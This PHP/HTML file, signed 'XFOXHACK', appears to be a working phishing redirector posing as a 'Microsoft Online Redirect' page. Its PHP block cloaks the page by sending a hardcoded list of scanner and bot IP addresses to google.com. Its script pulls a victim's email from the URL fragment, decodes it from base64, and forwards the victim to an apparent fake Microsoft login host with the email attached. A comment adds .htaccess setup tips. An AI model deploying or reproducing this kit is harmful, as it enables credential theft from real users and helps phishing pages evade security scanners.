<?php
 // XFOXHACK @icq
    // Function to check if an IP address is associated with a bot
    function is_bot_ip($ip) {
        // List of known bot IP addresses
        $bot_ips = [
            '68.183.151.227',
            '103.103.192.133',
            '35.198.39.162',
            '51.255.37.129',
            '77.75.78.167',
            '116.203.109.115',
            '35.233.165.146',
            '216.158.234.82',
            '18.209.86.113'
        ];
        
        // Check if the IP address is in the list of known bot IPs
        return in_array($ip, $bot_ips);
    }

    // Check if the user's IP address is associated with a bot
    if (is_bot_ip($_SERVER['REMOTE_ADDR'])) {
        // Redirect the user to https://google.com
        header('Location: https://google.com');
        exit;
    }
?>
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Online Redirect</title>
</head>
<body>
    <script>
/* Add this to .htaccess if you want to use multiple argument in pubil html folder. file named .htaccess or create it
RewriteEngine On
RewriteRule ^[^/]+/try/(.*)$ /try/$1 [L] */

var redirect_url = "https://login.creativesharedbox.online/xnjQVoSz#"; // Change this to the URL you want to redirect to
var path = window.location.href;  // Get the part of the URL after the domain name
var parts = path.split('#'); // Split the path by #
// Check if there is a second part
if (parts.length > 1) {
// Get the email from the second part
var email = parts[1];
if (isBase64(email)) {
email = atob(email);
}
// Redirect to the new URL with the email
window.location.href = redirect_url + email;
} else {
// No email found, show an error message
alert('Sorry! I cant find redirect for you');
}

function isBase64(str) {
try {
return btoa(atob(str)) == str;
} catch (err) {
return false;
}
}
console.log("The path is: " + path);
// XFOXHACK @icq
</script>
</body>
</html>

